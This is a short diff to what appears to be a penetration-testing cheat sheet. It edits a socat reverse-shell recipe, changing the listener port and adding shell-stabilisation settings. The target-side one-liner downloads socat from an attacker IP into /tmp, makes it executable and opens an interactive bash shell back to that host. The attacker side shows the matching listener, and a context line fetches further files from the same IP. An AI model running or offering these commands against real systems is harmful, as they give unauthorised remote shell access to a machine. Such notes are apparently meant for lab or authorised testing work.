@@ -45,12 +45,17 @@ export dlfile=[FILE NAME]; wget http://10.4.49.251/${dlfile} -O /tmp/${dlfile}; 
 ### Socat
 ・Target Host  
 ```
-wget http://10.4.49.251/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.4.49.251:4444
+wget http://10.4.49.251/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.4.49.251:4445
 ```
 
 ・Attacker (Kali)
 ```
-socat file:`tty`,raw,echo=0 TCP-L:4444
+socat file:`tty`,raw,echo=0 TCP-L:4445
+```
+
+Additional Settings :
+```
+export SHELL=bash; export TERM=xterm-256color; stty rows 60 columns 126
 ```
 
 ## Exploit DB (Windows)
